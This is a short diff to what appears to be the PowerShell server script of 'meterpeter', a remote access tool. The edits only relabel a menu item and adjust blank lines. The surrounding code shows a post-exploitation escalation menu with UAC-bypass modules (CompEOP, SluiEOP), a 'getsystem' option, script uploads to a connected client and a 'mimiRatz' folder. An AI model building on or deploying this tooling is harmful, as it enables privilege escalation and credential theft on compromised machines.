@@ -923,11 +923,10 @@ While($Client.Connected)
         write-host "   CompEOP     Execute 1 command as admin   Client:User  - Privileges required";
         write-host "   SluiEOP     Execute 1 command as admin   Client:User  - Privileges required";
         write-host "   getsystem   Escalate Client Privileges   Client:User  - Privileges required";
-        write-host "   Delete      Delete Priv Escal settings   Client:User  - Privileges required";
+        write-host "   Delete      Delete getsystem settings    Client:User  - Privileges required";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green;
         $Escal_choise = Read-Host;
-
         If($Escal_choise -eq "CompEOP" -or $Escal_choise -eq "compeop")
         {
            $name = "CompDefault.ps1";
@@ -980,7 +979,6 @@ While($Client.Connected)
               $Upload = $False; 
            }
         }
-
         If($Escal_choise -eq "SluiEOP" -or $Escal_choise -eq "slui")
         {
            $name = "SluiEOP.ps1";
@@ -2093,6 +2091,7 @@ While($Client.Connected)
             write-host "    ------------------";
             Write-Host "  $OutPut";
             $Cam_set = "False";
+
           }ElseIf($SluiEOP -eq "True"){
           
             cd mimiRatz
